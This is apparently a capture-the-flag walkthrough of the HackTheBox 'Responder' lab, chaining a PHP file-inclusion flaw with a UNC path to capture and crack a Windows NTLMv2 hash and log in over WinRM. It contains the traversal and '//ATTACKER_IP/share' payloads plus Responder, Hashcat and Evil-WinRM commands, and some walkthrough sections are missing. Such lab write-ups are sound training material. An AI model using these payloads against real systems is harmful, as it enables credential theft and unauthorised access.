// 01

Summary

Responder is the most complex machine of Starting Point Tier 1, introducing a three-step attack chain against a Windows target. It demonstrates how a web vulnerability can be used to steal Windows authentication credentials, which are then cracked offline and used for remote access.

The target hosts a PHP website on port 80 with a Local File Inclusion (LFI) vulnerability in the ?page= parameter. By supplying a UNC path (Windows network path, e.g. //10.10.x.x/share) pointing to our attacker machine, we force the Windows server to initiate an SMB authentication handshake — which includes the user's NTLMv2 hash.

The tool Responder listens on our machine and captures this hash. We then crack it offline with Hashcat (mode 5600 for NTLMv2), recover the plaintext password, and use Evil-WinRM to log in via WinRM (port 5985).

# Vulnerability Technique Impact
1 PHP LFI via ?page= parameter UNC path injection Forces outbound SMB authentication
2 NTLM hash leakage Responder listener NTLMv2 hash captured
3 Weak password Hashcat dictionary attack Plaintext password recovered → WinRM

// 02

Reconnaissance

1
Nmap — HTTP and WinRM
RECON
$ nmap -sV -sC 10.129.x.x
80/tcp open http Apache httpd 2.4.52 (Win64) PHP/8.1.1
|_http-title: unika.htb
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (WinRM)

Two services: HTTP on port 80 and WinRM on port 5985. The page title reveals the hostname unika.htb — we add it to /etc/hosts.

2
Add hostname to /etc/hosts
$ echo '10.129.x.x unika.htb' | sudo tee -a /etc/hosts
3
Discover LFI in ?page= parameter

The site has a language switcher. Changing the language updates the URL to http://unika.htb/?page=french.html. Testing ?page=../../../../../../../../windows/system32/drivers/etc/hosts confirms the LFI — the file's contents appear on the page.

As soon as this URL is visited, the Windows server attempts to authenticate to our Responder listener over SMB. Responder captures the full NTLMv2 hash of the Administrator account.

// 05

Tool Reference

Responder
sudo responder -I <iface> -v
Rogue authentication server that captures NTLMv2 hashes from Windows clients attempting SMB/HTTP authentication to our machine.
  • -I tun0 — listen on VPN interface
  • -v — verbose output
  • Logs stored in /usr/share/responder/logs/
Hashcat
hashcat -m 5600 <hash> <wordlist>
GPU-accelerated password recovery tool. Mode 5600 is for NTLMv2 (NetNTLMv2) hashes.
  • -m 5600 — NTLMv2 hash mode
  • -m 1000 — NTLM (local hash) mode
  • --show — display cracked hashes
Evil-WinRM
evil-winrm -i <ip> -u <user> -p <pass>
WinRM shell client for Windows remote management access. Provides a PowerShell session.
  • -i — target IP
  • -u — username
  • -p — password (or -H for hash)
  • upload / download — file transfer
LFI via UNC Path
?page=//ATTACKER_IP/share
UNC (Universal Naming Convention) paths trigger Windows SMB authentication to the specified host, useful for NTLM hash capture.
  • //IP/share — UNC format
  • Works when PHP allow_url_include is on
  • Also triggers via img src on some configs

// 06

Glossary

NTLM / NTLMv2 (NT LAN Manager)
NTLM is a suite of Microsoft authentication protocols using a challenge-response mechanism. When a client connects to a server, the server sends a random challenge; the client responds with an NTLM hash derived from the user's password and the challenge. This response — called the NetNTLMv2 hash — can be captured and cracked offline. NTLM has been superseded by Kerberos in modern AD environments, but still activates for non-domain authentication, including SMB to IP addresses and HTTP with Windows Integrated Auth.
LFI (Local File Inclusion)
Local File Inclusion is a web vulnerability where an application includes local file paths from user-controllable input without validation. In PHP, constructs like include($_GET['page']) are vulnerable. LFI can be used to read sensitive files (/etc/passwd, config files) or, when combined with UNC paths on Windows, to trigger outbound authentication. Advanced LFI can lead to Remote Code Execution via log poisoning or PHP filter chains.
WinRM (Windows Remote Management)
WinRM is Microsoft's implementation of the WS-Management protocol, enabling remote command execution via PowerShell over HTTP(S) on port 5985 (HTTP) or 5986 (HTTPS). It is the Windows equivalent of SSH. Attackers use Evil-WinRM to connect to targets where they have valid credentials. WinRM requires the connecting user to be a member of the Remote Management Users group or be a local administrator.
